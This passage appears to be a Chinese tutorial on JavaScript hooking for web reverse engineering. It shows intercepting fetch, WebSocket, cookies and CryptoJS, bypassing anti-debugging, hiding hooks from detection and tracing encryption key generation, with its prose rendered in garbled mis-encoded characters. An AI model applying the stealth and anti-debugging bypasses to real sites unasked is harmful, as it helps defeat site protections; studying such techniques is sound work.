    console.log(`â° [setInterval] Interval: ${delay}ms`);
    console.log(
      `â° [setInterval] Callback:`,
      callback.toString().substring(0, 100)
    );

    return originalSetInterval.apply(this, arguments);
  };
})();
</code></pre>
<hr />
<h2>WebSocket Hook</h2>
<pre><code class="language-javascript">(function () {
  const originalWebSocket = window.WebSocket;

  window.WebSocket = function (url, protocols) {
    console.log(`ğŸ”Œ [WebSocket] Connecting to: ${url}`);

    const ws = new originalWebSocket(url, protocols);

    // Hook send
    const originalSend = ws.send;
    ws.send = function (data) {
      console.log(&quot;ğŸ“¤ [WebSocket] Send:&quot;, data);
      return originalSend.apply(this, arguments);
    };

    // Hook onmessage
    ws.addEventListener(&quot;message&quot;, function (event) {
      console.log(&quot;ğŸ“¥ [WebSocket] Message:&quot;, event.data);
    });

    // Hook onopen
    ws.addEventListener(&quot;open&quot;, function () {
      console.log(&quot;âœ… [WebSocket] Connected&quot;);
    });

    // Hook onerror
    ws.addEventListener(&quot;error&quot;, function (error) {
      console.log(&quot;âŒ [WebSocket] Error:&quot;, error);
    });

    // Hook onclose
    ws.addEventListener(&quot;close&quot;, function () {
      console.log(&quot;ğŸ”´ [WebSocket] Closed&quot;);
    });

    return ws;
  };
})();
</code></pre>
<hr />
<h2>åè°ƒè¯•ç»•è¿‡</h2>
<h3>ç»•è¿‡ debugger</h3>
<pre><code class="language-javascript">// æ–¹æ³•ä¸€ï¼šé‡å†™ Function.prototype.constructor
(function () {
  const originalConstructor = Function.prototype.constructor;

  Function.prototype.constructor = function (...args) {
    // æ£€æŸ¥æ˜¯å¦åŒ…å« 'debugger'
    const code = args[args.length - 1];
    if (typeof code === &quot;string&quot; &amp;&amp; code.includes(&quot;debugger&quot;)) {
      console.log(&quot;ğŸš« [Anti-Debug] Blocked debugger&quot;);
      // è¿”å›ç©ºå‡½æ•°
      return function () {};
    }

    return originalConstructor.apply(this, args);
  };
})();

// æ–¹æ³•äºŒï¼šä½¿ç”¨ Chrome DevTools
// å³é”® debugger è¡Œ -&gt; &quot;Never pause here&quot;
</code></pre>
<h3>Hook console æ£€æµ‹ç»•è¿‡</h3>
<pre><code class="language-javascript">(function () {
  // æŸäº›ç½‘ç«™é€šè¿‡æ£€æµ‹ console è¢«æ‰“å¼€æ¥åè°ƒè¯•
  // é‡å†™ console æ–¹æ³•è¿”å›å›ºå®šå€¼

  const noop = function () {};
  const originalConsole = { ...console };

  window.console = {
    log: noop,
    debug: noop,
    info: noop,
    warn: noop,
    error: noop,
    // ä¿ç•™åŸå§‹ console ä¾›æˆ‘ä»¬ä½¿ç”¨
    _original: originalConsole,
  };

  // ä½¿ç”¨ï¼šwindow.console._original.log('message');
})();
</code></pre>
<hr />
<h2>ç»¼åˆ Hook è„šæœ¬</h2>
<h3>ä¸€é”®ç›‘æ§æ‰€æœ‰å…³é”® API</h3>
<pre><code class="language-javascript">(function () {
  console.log(&quot;ğŸ£ Universal Hook Script Loaded&quot;);

  // 1. Network
  const originalFetch = window.fetch;
  window.fetch = async function (...args) {
    console.log(`ğŸŒ [Fetch]`, args);
    const response = await originalFetch.apply(this, args);
    const clone = response.clone();
    const text = await clone.text();
    console.log(`ğŸ“¥ [Fetch] Response:`, text.substring(0, 200));
    return response;
  };

  // 2. Cookie
  let cookieCache = document.cookie;
  Object.defineProperty(document, &quot;cookie&quot;, {
    get: () =&gt; (console.log(&quot;ğŸª [Cookie] Read&quot;), cookieCache),
    set: (v) =&gt; (console.log(&quot;ğŸª [Cookie] Write:&quot;, v), (cookieCache = v), v),
  });

  // 3. LocalStorage
  const originalSetItem = localStorage.setItem;
  localStorage.setItem = function (k, v) {
    console.log(`ğŸ’¾ [LocalStorage] ${k} = ${v}`);
    return originalSetItem.apply(this, arguments);
  };

  // 4. JSON
  const originalStringify = JSON.stringify;
  JSON.stringify = function (obj) {
    console.log(&quot;ğŸ“ [JSON.stringify]&quot;, obj);
    return originalStringify.apply(this, arguments);
  };

  // 5. CryptoJS (å¦‚æœå­˜åœ¨)
  if (window.CryptoJS) {
    const originalMD5 = CryptoJS.MD5;
    CryptoJS.MD5 = function (...args) {
      const result = originalMD5.apply(this, args);
      console.log(`ğŸ” [MD5] ${args[0]} =&gt; ${result}`);
      return result;
    };
  }

  console.log(&quot;âœ… All hooks installed!&quot;);
})();
</code></pre>
<hr />
<h2>ä½¿ç”¨å»ºè®®</h2>
<h3>åœ¨ DevTools Console ä¸­æ‰§è¡Œ</h3>
<ol>
<li>æ‰“å¼€ DevTools</li>
<li>åˆ‡æ¢åˆ° Console æ ‡ç­¾</li>
<li>ç²˜è´´ Hook è„šæœ¬</li>
<li>å›è½¦æ‰§è¡Œ</li>
<li>åˆ·æ–°é¡µé¢æˆ–è§¦å‘æ“ä½œ</li>
</ol>
<h3>ä¿å­˜ä¸º Snippet</h3>
<ol>
<li>DevTools -&gt; Sources -&gt; Snippets</li>
<li>æ–°å»º Snippet</li>
<li>ç²˜è´´ Hook è„šæœ¬</li>
<li><code>Ctrl+Enter</code> æ‰§è¡Œ</li>
</ol>
<h3>ä½¿ç”¨æµè§ˆå™¨æ’ä»¶</h3>
<p>å¯ä»¥å°† Hook è„šæœ¬æ³¨å…¥åˆ° Tampermonkey ç­‰æ’ä»¶ä¸­ï¼Œå®ç°è‡ªåŠ¨åŠ è½½ã€‚</p>
<hr />
<h2>é«˜çº§ Hook æŠ€æœ¯</h2>
<h3>ä½¿ç”¨ Proxy å®ç°æ·±åº¦æ‹¦æˆª</h3>
<p>ES6 Proxy æä¾›äº†æ›´å¼ºå¤§çš„æ‹¦æˆªèƒ½åŠ›ï¼Œå¯ä»¥æ‹¦æˆªå¯¹è±¡çš„æ‰€æœ‰æ“ä½œï¼š</p>
<pre><code class="language-javascript">// Hook æ•´ä¸ªå¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•
function deepHookObject(obj, name = &quot;Object&quot;) {
  return new Proxy(obj, {
    get(target, prop, receiver) {
      const value = Reflect.get(target, prop, receiver);

      // å¦‚æœæ˜¯å‡½æ•°ï¼Œåˆ™åŒ…è£…å®ƒ
      if (typeof value === &quot;function&quot;) {
        return new Proxy(value, {
          apply(fn, thisArg, args) {
            console.log(`ğŸ” [${name}.${String(prop)}] è°ƒç”¨`);
            console.log(&quot;   å‚æ•°:&quot;, args);

            const result = Reflect.apply(fn, thisArg, args);

            console.log(&quot;   è¿”å›:&quot;, result);
            return result;
          },
        });
      }

      return value;
    },

    set(target, prop, value, receiver) {
      console.log(`ğŸ“ [${name}.${String(prop)}] è®¾ç½®ä¸º:`, value);
      return Reflect.set(target, prop, value, receiver);
    },
  });
}

// ä½¿ç”¨ç¤ºä¾‹ï¼šHook æ•´ä¸ª localStorage
window.localStorage = deepHookObject(window.localStorage, &quot;localStorage&quot;);
</code></pre>
<h3>æ€§èƒ½ä¼˜åŒ–ï¼šæ¡ä»¶ Hook</h3>
<p>é¿å…è¿‡åº¦æ—¥å¿—è¾“å‡ºå½±å“æ€§èƒ½ï¼š</p>
<pre><code class="language-javascript">// æ¡ä»¶ Hook - åªè®°å½•ç‰¹å®šæ¡ä»¶
(function () {
  const originalFetch = window.fetch;
  const INTERESTING_URLS = [&quot;/api/user&quot;, &quot;/api/login&quot;, &quot;/api/data&quot;];

  window.fetch = async function (...args) {
    const url = args[0];
    const shouldLog = INTERESTING_URLS.some((pattern) =&gt; url.includes(pattern));

    if (shouldLog) {
      console.log(&quot;ğŸŒ [Fetch]&quot;, url);
    }

    const response = await originalFetch.apply(this, args);

    if (shouldLog) {
      const clone = response.clone();
      const text = await clone.text();
      console.log(&quot;ğŸ“¥ [Response]&quot;, text.substring(0, 200));
    }

    return response;
  };
})();
</code></pre>
<h3>å‡½æ•°è°ƒç”¨æ ˆè¿½è¸ª</h3>
<p>ç²¾ç¡®å®šä½å‡½æ•°è°ƒç”¨æ¥æºï¼š</p>
<pre><code class="language-javascript">function hookWithStackTrace(obj, methodName) {
  const original = obj[methodName];

  obj[methodName] = function (...args) {
    console.log(`ğŸ¯ [${methodName}] è¢«è°ƒç”¨`);
    console.log(&quot;å‚æ•°:&quot;, args);

    // è·å–è°ƒç”¨æ ˆ
    const stack = new Error().stack;
    const callerLine = stack.split(&quot;\n&quot;)[2]; // ç¬¬ä¸‰è¡Œæ˜¯è°ƒç”¨è€…
    console.log(&quot;è°ƒç”¨ä½ç½®:&quot;, callerLine.trim());

    // åªåœ¨ç‰¹å®šä½ç½®è§¦å‘æ–­ç‚¹
    if (callerLine.includes(&quot;encrypt&quot;)) {
      debugger; // æ¡ä»¶æ–­ç‚¹
    }

    return original.apply(this, args);
  };
}

// ç¤ºä¾‹ï¼šè¿½è¸ª MD5 è°ƒç”¨æ¥æº
if (window.CryptoJS) {
  hookWithStackTrace(CryptoJS, &quot;MD5&quot;);
}
</code></pre>
<h3>Hook è®¡æ•°å™¨å’Œæ€§èƒ½åˆ†æ</h3>
<pre><code class="language-javascript">class FunctionProfiler {
  constructor() {
    this.stats = new Map();
  }

  hook(obj, methodName, displayName) {
    const original = obj[methodName];
    const stats = {
      callCount: 0,
      totalTime: 0,
      minTime: Infinity,
      maxTime: 0,
    };

    this.stats.set(displayName, stats);

    obj[methodName] = function (...args) {
      stats.callCount++;
      const startTime = performance.now();

      const result = original.apply(this, args);

      const duration = performance.now() - startTime;
      stats.totalTime += duration;
      stats.minTime = Math.min(stats.minTime, duration);
      stats.maxTime = Math.max(stats.maxTime, duration);

      return result;
    };
  }

  report() {
    console.log(&quot;\n=== å‡½æ•°æ€§èƒ½æŠ¥å‘Š ===&quot;);
    for (const [name, stats] of this.stats.entries()) {
      console.log(`\n${name}:`);
      console.log(`  è°ƒç”¨æ¬¡æ•°: ${stats.callCount}`);
      console.log(`  æ€»è€—æ—¶: ${stats.totalTime.toFixed(2)}ms`);
      console.log(
        `  å¹³å‡è€—æ—¶: ${(stats.totalTime / stats.callCount).toFixed(2)}ms`
      );
      console.log(`  æœ€å°è€—æ—¶: ${stats.minTime.toFixed(2)}ms`);
      console.log(`  æœ€å¤§è€—æ—¶: ${stats.maxTime.toFixed(2)}ms`);
    }
  }
}

// ä½¿ç”¨ç¤ºä¾‹
const profiler = new FunctionProfiler();
profiler.hook(XMLHttpRequest.prototype, &quot;send&quot;, &quot;XHR.send&quot;);
profiler.hook(window, &quot;fetch&quot;, &quot;Fetch&quot;);

// ç¨åæŸ¥çœ‹æŠ¥å‘Š
setTimeout(() =&gt; profiler.report(), 10000);
</code></pre>
<h3>é˜²å¾¡æ€§ Hook - é¿å…è¢«æ£€æµ‹</h3>
<p>æœ‰äº›ç½‘ç«™ä¼šæ£€æµ‹ Hook ç—•è¿¹ï¼Œéœ€è¦æ›´éšè”½çš„æ–¹å¼ï¼š</p>
<pre><code class="language-javascript">// æ–¹æ³•1: ä½¿ç”¨ Proxy ä¿æŒå‡½æ•°ç‰¹æ€§
function stealthHook(obj, prop, handler) {
  const original = obj[prop];

  // åˆ›å»º Proxyï¼Œä¿ç•™åŸå‡½æ•°çš„æ‰€æœ‰å±æ€§
  const proxy = new Proxy(original, {
    apply(target, thisArg, args) {
      handler.before &amp;&amp; handler.before(args);
      const result = Reflect.apply(target, thisArg, args);
      handler.after &amp;&amp; handler.after(result);
      return result;
    },
  });

  // å¤åˆ¶åŸå‡½æ•°çš„å±æ€§
  Object.setPrototypeOf(proxy, Object.getPrototypeOf(original));
  Object.defineProperty(obj, prop, {
    value: proxy,
    writable: true,
    enumerable: false,
    configurable: true,
  });
}

// æ–¹æ³•2: ä¿æŒ toString() ä¸€è‡´
function invisibleHook(obj, methodName, callback) {
  const original = obj[methodName];
  const originalToString = original.toString();

  obj[methodName] = function (...args) {
    callback(args);
    return original.apply(this, args);
  };

  // ä¼ªé€  toString
  obj[methodName].toString = function () {
    return originalToString;
  };

  // éšè— Proxy ç‰¹å¾
  Object.defineProperty(obj[methodName], &quot;name&quot;, {
    value: original.name,
  });
}
</code></pre>
<h3>é€’å½’ Hook - è‡ªåŠ¨å‘ç°å’Œ Hook æ–°æ–¹æ³•</h3>
<pre><code class="language-javascript">// è‡ªåŠ¨ Hook æ‰€æœ‰è¢«è°ƒç”¨çš„åŠ å¯†æ–¹æ³•
(function () {
  if (!window.CryptoJS) return;

  const hookedMethods = new Set();

  function autoHook(obj, prefix = &quot;CryptoJS&quot;) {
    return new Proxy(obj, {
      get(target, prop) {
        const value = target[prop];
        const fullName = `${prefix}.${String(prop)}`;

        if (typeof value === &quot;function&quot; &amp;&amp; !hookedMethods.has(fullName)) {
          hookedMethods.add(fullName);
          console.log(`ğŸ£ è‡ªåŠ¨ Hook: ${fullName}`);

          return new Proxy(value, {
            apply(fn, thisArg, args) {
              console.log(`ğŸ” [${fullName}]`, args);
              return Reflect.apply(fn, thisArg, args);
            },
          });
        }

        if (typeof value === &quot;object&quot; &amp;&amp; value !== null) {
          return autoHook(value, fullName);
        }

        return value;
      },
    });
  }

  window.CryptoJS = autoHook(window.CryptoJS);
})();
</code></pre>
<hr />
<h2>Hook æ¡†æ¶å°è£…</h2>
<h3>é€šç”¨ Hook ç®¡ç†å™¨</h3>
<pre><code class="language-javascript">class HookManager {
  constructor() {
    this.hooks = [];
    this.enabled = true;
  }

  // æ³¨å†Œ Hook
  register(config) {
    const { target, method, before, after, condition } = config;
    const original = target[method];

    if (!original) {
      console.warn(`âš ï¸  æ–¹æ³• ${method} ä¸å­˜åœ¨`);
      return;
    }

    const hookId = this.hooks.length;

    target[method] = (...args) =&gt; {
      if (!this.enabled) {
        return original.apply(target, args);
      }

      // æ¡ä»¶æ£€æŸ¥
      if (condition &amp;&amp; !condition(args)) {
        return original.apply(target, args);
      }

      // å‰ç½®å¤„ç†
      if (before) {
        const modifiedArgs = before(args);
        if (modifiedArgs !== undefined) {
          args = modifiedArgs;
        }
      }

      // è°ƒç”¨åŸå‡½æ•°
      const result = original.apply(target, args);

      // åç½®å¤„ç†
      if (after) {
        const modifiedResult = after(result, args);
        if (modifiedResult !== undefined) {
          return modifiedResult;
        }
      }

      return result;
    };

    this.hooks.push({
      id: hookId,
      target,
      method,
      original,
    });

    return hookId;
  }

  // ç§»é™¤ Hook
  remove(hookId) {
    const hook = this.hooks[hookId];
    if (hook) {
      hook.target[hook.method] = hook.original;
      console.log(`âœ… Hook ${hookId} å·²ç§»é™¤`);
    }
  }

  // å…¨å±€å¯ç”¨/ç¦ç”¨
  toggle(enabled) {
    this.enabled = enabled;
    console.log(`ğŸ”„ Hook ${enabled ? &quot;å¯ç”¨&quot; : &quot;ç¦ç”¨&quot;}`);
  }
}

// ä½¿ç”¨ç¤ºä¾‹
const hookManager = new HookManager();

// Hook Fetch è¯·æ±‚
hookManager.register({
  target: window,
  method: &quot;fetch&quot;,
  before: (args) =&gt; {
    console.log(&quot;ğŸŒ Fetch:&quot;, args[0]);
  },
  after: async (response) =&gt; {
    const clone = response.clone();
    const text = await clone.text();
    console.log(&quot;ğŸ“¥ Response:&quot;, text.substring(0, 100));
  },
  condition: (args) =&gt; {
    // åª Hook API è¯·æ±‚
    return args[0].includes(&quot;/api/&quot;);
  },
});

// ä¸´æ—¶ç¦ç”¨æ‰€æœ‰ Hook
hookManager.toggle(false);
</code></pre>
<hr />
<h2>å®æˆ˜è¿›é˜¶æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ 1: ç ´è§£åŠ¨æ€å¯†é’¥ç”Ÿæˆç®—æ³•</h3>
<p><strong>åœºæ™¯</strong>: æ¯æ¬¡è¯·æ±‚çš„åŠ å¯†å¯†é’¥éƒ½ä¸åŒï¼Œéœ€è¦è¿½è¸ªå¯†é’¥ç”Ÿæˆé€»è¾‘</p>
<pre><code class="language-javascript">// Step 1: Hook æ‰€æœ‰å¯èƒ½çš„å¯†é’¥æ¥æº
const keyTracker = {
  sources: [],

  trackRandom() {
    const originalRandom = Math.random;
    Math.random = function () {
      const value = originalRandom();
      keyTracker.sources.push({ type: &quot;Math.random&quot;, value });
      return value;
    };
  },

  trackTimestamp() {
    const originalNow = Date.now;
    Date.now = function () {
      const value = originalNow();
      keyTracker.sources.push({ type: &quot;Date.now&quot;, value });
      return value;
    };
  },

  trackCrypto() {
    if (window.crypto &amp;&amp; window.crypto.getRandomValues) {
      const original = window.crypto.getRandomValues.bind(window.crypto);
      window.crypto.getRandomValues = function (array) {
        const result = original(array);
        keyTracker.sources.push({
          type: &quot;crypto.getRandomValues&quot;,
          value: Array.from(array),
        });
        return result;
      };
    }
  },

  init() {
    this.trackRandom();
    this.trackTimestamp();
    this.trackCrypto();
    console.log(&quot;ğŸ” å¯†é’¥è¿½è¸ªå™¨å·²å¯åŠ¨&quot;);
  },

  analyze() {
    console.log(&quot;=== å¯†é’¥æ¥æºåˆ†æ ===&quot;);
    console.log(`æ€»è®¡ ${this.sources.length} ä¸ªéšæœºæº`);
    this.sources.forEach((source, i) =&gt; {
      console.log(`${i + 1}. ${source.type}:`, source.value);
    });
  },
};

keyTracker.init();

// è§¦å‘åŠ å¯†æ“ä½œå
setTimeout(() =&gt; keyTracker.analyze(), 5000);
</code></pre>
<h3>æ¡ˆä¾‹ 2: ç»•è¿‡è™šæ‹Ÿæœºæ£€æµ‹</h3>
<p>æŸäº›ç½‘ç«™ä½¿ç”¨è™šæ‹Ÿæœºï¼ˆVMï¼‰æ‰§è¡Œå…³é”®ä»£ç ä»¥é˜²æ­¢åˆ†æï¼š</p>
<pre><code class="language-javascript">// æ£€æµ‹å¹¶ Hook VM ç¯å¢ƒ
(function () {
  // å¸¸è§çš„ VM ç‰¹å¾
  const vmPatterns = [
    &quot;eval&quot;,
    &quot;Function&quot;,
    &quot;with&quot;,
    &quot;Proxy&quot;,
    &quot;_0x&quot;, // æ··æ·†ç‰¹å¾
    &quot;constructor&quot;,
  ];

  // Hook Function æ„é€ å‡½æ•°
  const OriginalFunction = Function;
  window.Function = new Proxy(OriginalFunction, {
    construct(target, args) {
      const code = args[args.length - 1];

      // æ£€æŸ¥æ˜¯å¦æ˜¯ VM ä»£ç 
      const isVM = vmPatterns.some((pattern) =&gt; code.includes(pattern));

      if (isVM) {
        console.log(&quot;ğŸš¨ æ£€æµ‹åˆ° VM ä»£ç æ‰§è¡Œ&quot;);
        console.log(&quot;ä»£ç ç‰‡æ®µ:&quot;, code.substring(0, 200));
        debugger; // æ–­ç‚¹
      }

      return Reflect.construct(target, args);
    },
  });

  console.log(&quot;âœ… VM æ£€æµ‹ Hook å·²å®‰è£…&quot;);
})();
</code></pre>
<h3>æ¡ˆä¾‹ 3: å‚æ•°æ±¡æŸ“æ£€æµ‹</h3>
<p>è‡ªåŠ¨æ£€æµ‹å“ªäº›å‚æ•°å¯¹åŠ å¯†ç»“æœæœ‰å½±å“ï¼š</p>
<pre><code class="language-javascript">class ParameterAnalyzer {
  constructor(targetFunction, referenceOutput) {
    this.targetFunction = targetFunction;
    this.referenceOutput = referenceOutput;
    this.results = [];
  }

  // æµ‹è¯•å•ä¸ªå‚æ•°çš„å½±å“
  testParameter(baseParams, paramIndex, testValue) {
    const testParams = [...baseParams];
    testParams[paramIndex] = testValue;

    const output = this.targetFunction(...testParams);
    const changed = output !== this.referenceOutput;

    this.results.push({
      paramIndex,
      testValue,
      output,
      changed,
    });

    return changed;
  }

  // è‡ªåŠ¨åŒ–æµ‹è¯•
  analyze(baseParams) {
    console.log(&quot;ğŸ”¬ å¼€å§‹å‚æ•°åˆ†æ&quot;);

    baseParams.forEach((param, index) =&gt; {
      console.log(`\næµ‹è¯•å‚æ•° ${index}:`);

      // æµ‹è¯•ä¸åŒçš„å€¼
      const testValues = [
        null,
        undefined,
        &quot;&quot;,
        0,
        param + &quot;_modified&quot;,
        param.toUpperCase?.(),
      ].filter((v) =&gt; v !== undefined);

      testValues.forEach((testValue) =&gt; {
        const changed = this.testParameter(baseParams, index, testValue);
        console.log(
          `  ${JSON.stringify(testValue)} =&gt; ${
            changed ? &quot;âœ… å½±å“è¾“å‡º&quot; : &quot;âŒ æ— å½±å“&quot;
          }`
        );
      });
    });

    this.report();
  }

  report() {
    console.log(&quot;\n=== åˆ†ææŠ¥å‘Š ===&quot;);
    const criticalParams = this.results
      .filter((r) =&gt; r.changed)
      .map((r) =&gt; r.paramIndex);

    console.log(&quot;å…³é”®å‚æ•°ç´¢å¼•:&quot;, [...new Set(criticalParams)]);
  }
}

// ä½¿ç”¨ç¤ºä¾‹
// å‡è®¾å‘ç°äº†åŠ å¯†å‡½æ•° encryptData(timestamp, userId, data)
const analyzer = new ParameterAnalyzer(
  window.encryptData,
  window.encryptData(1638360000, &quot;123&quot;, &quot;test&quot;)
);

analyzer.analyze([1638360000, &quot;123&quot;, &quot;test&quot;]);
</code></pre>
<hr />
<h2>è°ƒè¯•é›†æˆæŠ€å·§</h2>
<h3>æ¡ä»¶æ—¥å¿—</h3>
<p>åªåœ¨æ»¡è¶³æ¡ä»¶æ—¶è¾“å‡ºæ—¥å¿—ï¼Œå‡å°‘å™ªéŸ³ï¼š</p>
<pre><code class="language-javascript">class ConditionalLogger {
  constructor(condition) {
    this.condition = condition;
    this.buffer = [];
  }

  log(...args) {
    if (this.condition()) {
      console.log(...args);
    } else {
      this.buffer.push(args);
    }
  }

  flush() {
    console.log(&quot;=== ç¼“å†²æ—¥å¿— ===&quot;);
    this.buffer.forEach((args) =&gt; console.log(...args));
    this.buffer = [];
  }
}

// åªåœ¨ç‰¹å®šURLæ—¶è®°å½•
const logger = new ConditionalLogger(() =&gt; {
  return window.location.href.includes(&quot;/login&quot;);
});

logger.log(&quot;è¿™æ¡æ—¥å¿—åªåœ¨ /login é¡µé¢æ˜¾ç¤º&quot;);
</code></pre>
<h3>è‡ªåŠ¨åŒ–æ–­ç‚¹æ³¨å…¥</h3>
<pre><code class="language-javascript">// åœ¨åŠ å¯†å‡½æ•°çš„å…³é”®å‚æ•°å¤„è‡ªåŠ¨æ–­ç‚¹
function autoBreakpoint(obj, method, paramChecker) {
  const original = obj[method];

  obj[method] = function (...args) {
    if (paramChecker(args)) {
      console.log(&quot;ğŸ¯ è§¦å‘è‡ªåŠ¨æ–­ç‚¹&quot;);
      console.log(&quot;å‚æ•°:&quot;, args);
      debugger; // è‡ªåŠ¨æ–­ç‚¹
    }

    return original.apply(this, args);
  };
}

// ç¤ºä¾‹ï¼šå½“å¯†é’¥åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²æ—¶æ–­ç‚¹
autoBreakpoint(CryptoJS.AES, &quot;encrypt&quot;, (args) =&gt; {
  const key = args[1]?.toString();
  return key &amp;&amp; key.includes(&quot;secret&quot;);
});
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µæ€»ç»“</h2>
<h3>1. Hook æ—¶æœº</h3>
<ul>
<li><strong>å°½æ—©æ³¨å…¥</strong>: åœ¨é¡µé¢è„šæœ¬æ‰§è¡Œå‰æ³¨å…¥ Hookï¼ˆä½¿ç”¨æµè§ˆå™¨æ‰©å±•æˆ–ä»£ç†ï¼‰</li>
<li><strong>å¼‚æ­¥ Hook</strong>: å¯¹äºåŠ¨æ€åŠ è½½çš„åº“ï¼Œä½¿ç”¨ MutationObserver ç›‘å¬</li>
</ul>
<pre><code class="language-javascript">// ç›‘å¬åŠ¨æ€åŠ è½½çš„ CryptoJS
const observer = new MutationObserver(() =&gt; {
  if (window.CryptoJS &amp;&amp; !window._cryptoHooked) {
    window._cryptoHooked = true;
    // å®‰è£… Hook
    console.log(&quot;âœ… CryptoJS å·²åŠ è½½ï¼Œå®‰è£… Hook&quot;);
  }
});

observer.observe(document, { childList: true, subtree: true });
</code></pre>
<h3>2. æ€§èƒ½è€ƒè™‘</h3>
<ul>
<li>é¿å…åœ¨ Hook ä¸­æ‰§è¡Œè€—æ—¶æ“ä½œ</li>
<li>ä½¿ç”¨æ¡ä»¶åˆ¤æ–­å‡å°‘ä¸å¿…è¦çš„æ—¥å¿—</li>
<li>è€ƒè™‘ä½¿ç”¨ <code>requestIdleCallback</code> å»¶è¿Ÿéå…³é”®æ—¥å¿—</li>
</ul>
<h3>3. é”™è¯¯å¤„ç†</h3>
<pre><code class="language-javascript">function safeHook(obj, method, callback) {
  const original = obj[method];

  obj[method] = function (...args) {
    try {
      callback(args);
    } catch (error) {
      console.error(&quot;Hook é”™è¯¯:&quot;, error);
      // ç»§ç»­æ‰§è¡ŒåŸå‡½æ•°
    }

    return original.apply(this, args);
  };
}
</code></pre>
<h3>4. æ¸…ç†å’Œæ¢å¤</h3>
<p>å§‹ç»ˆä¿å­˜åŸå‡½æ•°å¼•ç”¨ï¼Œä¾¿äºæ¢å¤ï¼š</p>
<pre><code class="language-javascript">window._originalFunctions = window._originalFunctions || {};

function installHook(obj, method, hook) {
  const key = `${obj.constructor.name}.${method}`;
  window._originalFunctions[key] = obj[method];
  obj[method] = hook(obj[method]);
}

function uninstallAllHooks() {
  for (const [key, original] of Object.entries(window._originalFunctions)) {
    const [objName, method] = key.split(&quot;.&quot;);
    window[objName][method] = original;
  }
  console.log(&quot;âœ… æ‰€æœ‰ Hook å·²ç§»é™¤&quot;);
}
</code></pre>
<hr />
<h2>å·¥å…·æ¨è</h2>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>ç”¨é€”</th>
  <th>é“¾æ¥</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Tampermonkey</strong></td>
  <td>ç”¨æˆ·è„šæœ¬ç®¡ç†ï¼Œè‡ªåŠ¨æ³¨å…¥ Hook</td>
  <td>https://www.tampermonkey.net/</td>
</tr>
<tr>
  <td><strong>Proxy SwitchyOmega</strong></td>
  <td>ä»£ç†åˆ‡æ¢ï¼Œé…åˆ mitmproxy æ³¨å…¥</td>
  <td>https://github.com/FelisCatus/SwitchyOmega</td>
</tr>
<tr>
  <td><strong>Chrome DevTools</strong></td>
  <td>åŸç”Ÿæ–­ç‚¹å’Œç›‘æ§</td>
  <td>å†…ç½®</td>
</tr>
<tr>
  <td><strong>Frida</strong></td>
  <td>åŠ¨æ€æ’æ¡©æ¡†æ¶ï¼ˆé€‚ç”¨äº Appï¼‰</td>
  <td>https://frida.re/</td>
</tr>
</tbody>
</table>
<hr />
<h2>å•†ä¸šåŒ–åŠ¨æ€åˆ†æå¹³å°å¯¹æ¯”</h2>
<p>å¯¹äºä¼ä¸šçº§é¡¹ç›®ï¼Œå•†ä¸šåŒ–çš„åŠ¨æ€åˆ†æå’Œ Hook å¹³å°å¯ä»¥æ˜¾è‘—æå‡æ•ˆç‡å’Œå¯é æ€§ã€‚ä»¥ä¸‹æ˜¯å¸‚åœºä¸»æµæ–¹æ¡ˆå¯¹æ¯”ã€‚</p>
<h3>1. ä¸“ä¸šåŠ¨æ€åˆ†æå·¥å…·</h3>
<h4>Fridaï¼ˆå¼€æºï¼Œä¼ä¸šçº§å¯ç”¨ï¼‰</h4>
<p><strong>å®šä½</strong>: æœ€æµè¡Œçš„åŠ¨æ€æ’æ¡©æ¡†æ¶</p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>:</p>
<ul>
<li>æ”¯æŒ JavaScript/Python/Swift ç­‰å¤šè¯­è¨€</li>
<li>è·¨å¹³å°ï¼ˆiOS/Android/Windows/macOS/Linuxï¼‰</li>
<li>æ´»è·ƒçš„ç¤¾åŒºå’Œä¸°å¯Œçš„è„šæœ¬åº“</li>
<li>ä¼ä¸šå¯å…è´¹ä½¿ç”¨</li>
</ul>
<p><strong>åº”ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>ç§»åŠ¨åº”ç”¨é€†å‘</li>
<li>Web åº”ç”¨åŠ¨æ€åˆ†æ</li>
<li>æ¶æ„è½¯ä»¶åˆ†æ</li>
<li>å®‰å…¨ç ”ç©¶</li>
</ul>
<p><strong>GitHub</strong>: https://github.com/frida/frida</p>
<p><strong>å­¦ä¹ æˆæœ¬</strong>: ä¸­ç­‰</p>
<p><strong>ä¼ä¸šä½¿ç”¨</strong>:</p>
<ul>
<li>âœ… å®Œå…¨å…è´¹</li>
<li>âœ… æ— ä½¿ç”¨é™åˆ¶</li>
<li>âœ… å¯å•†ä¸šåŒ–</li>
<li>âŒ éœ€è¦æŠ€æœ¯å›¢é˜Ÿç»´æŠ¤</li>
</ul>
<hr />
<h4>Charles Proxyï¼ˆå•†ä¸šç½‘ç»œè°ƒè¯•å·¥å…·ï¼‰</h4>
<p><strong>å®šä½</strong>: HTTP/HTTPS æŠ“åŒ…å’Œè°ƒè¯•</p>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>SSL è¯ä¹¦ä¸­é—´äººæ‹¦æˆª</li>
<li>è¯·æ±‚/å“åº”ä¿®æ”¹</li>
<li>æ–­ç‚¹å’Œé‡æ”¾</li>
<li>æµé‡é™é€Ÿæ¨¡æ‹Ÿ</li>
</ul>
<p><strong>ä»·æ ¼</strong>:</p>
<ul>
<li>ä¸ªäººè®¸å¯: $50ï¼ˆä¸€æ¬¡æ€§ï¼‰</li>
<li>å•†ä¸šè®¸å¯: $100+</li>
</ul>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>å›¾å½¢åŒ–ç•Œé¢ï¼Œæ˜“ç”¨æ€§å¼º</li>
<li>ç¨³å®šå¯é </li>
<li>è·¨å¹³å°æ”¯æŒ</li>
</ul>
<p><strong>åŠ£åŠ¿</strong>:</p>
<ul>
<li>ä»…é™ç½‘ç»œå±‚ Hook</li>
<li>æ— æ³• Hook JavaScript å‡½æ•°</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://www.charlesproxy.com/</p>
<p><strong>é€‚ç”¨</strong>: ç½‘ç»œå±‚åˆ†æã€API è°ƒè¯•</p>
<hr />
<h4>Burp Suite Professional</h4>
<p><strong>å®šä½</strong>: Web å®‰å…¨æµ‹è¯•ä¸“ä¸šå·¥å…·</p>
